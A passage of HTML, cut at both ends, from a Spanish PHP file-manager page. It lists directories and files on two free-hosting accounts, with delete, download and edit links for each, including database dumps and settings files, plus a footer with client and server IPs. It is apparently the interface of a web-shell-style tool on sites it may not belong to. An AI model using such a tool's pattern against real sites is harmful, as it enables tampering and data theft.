                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">registro-check-email.php</a></td>
                    <td>Archivo</td>
                    <td>214 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">registro-check-nick.php</a></td>
                    <td>Archivo</td>
                    <td>232 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">registro-confirmar.php</a></td>
                    <td>Archivo</td>
                    <td>698 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">registro-form.php</a></td>
                    <td>Archivo</td>
                    <td>24.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">registro-geo.php</a></td>
                    <td>Archivo</td>
                    <td>1.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">registro-notificacion.php</a></td>
                    <td>Archivo</td>
                    <td>303 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">registro2.php</a></td>
                    <td>Archivo</td>
                    <td>4.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">registrooff.php</a></td>
                    <td>Archivo</td>
                    <td>21.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">salir.php</a></td>
                    <td>Archivo</td>
                    <td>299 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">session.php</a></td>
                    <td>Archivo</td>
                    <td>1.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">staff.php</a></td>
                    <td>Archivo</td>
                    <td>4.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">tagcloud.php</a></td>
                    <td>Archivo</td>
                    <td>10.53 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">tagss.php</a></td>
                    <td>Archivo</td>
                    <td>50.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">terminos-y-condiciones.php</a></td>
                    <td>Archivo</td>
                    <td>34.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">top.php</a></td>
                    <td>Archivo</td>
                    <td>32.88 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">trabajo.php</a></td>
                    <td>Archivo</td>
                    <td>3.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">ultimos_comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>899 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">usuarios.php</a></td>
                    <td>Archivo</td>
                    <td>21.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">votar.php</a></td>
                    <td>Archivo</td>
                    <td>2.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">x.php</a></td>
                    <td>Archivo</td>
                    <td>10.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">Editar</a>
                    </td>
                    </tr></table><div id="pie">
    <div id="pie_logo"></div><a id="servidor" href="http://189.245.74.75/">Tu IP: 189.245.74.75</a>
    <a id="servidor" href="http://209.190.85.12/">IP del servidor: 209.190.85.12</a>
    <span id="carga" href="#">0.458 seg</span>
    </div> <table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages">Packages</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys">Smileys</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources">Sources</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes">Themes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web">web</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>206 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">.htaccess.backup</a></td>
                    <td>Archivo</td>
                    <td>787 B</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>45 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">DB.sql</a></td>
                    <td>Archivo</td>
                    <td>51.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">SSI.php</a></td>
                    <td>Archivo</td>
                    <td>12.13 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Settings.php</a></td>
                    <td>Archivo</td>
                    <td>1016 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">SourcesSubs.php</a></td>
                    <td>Archivo</td>
                    <td>144.45 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
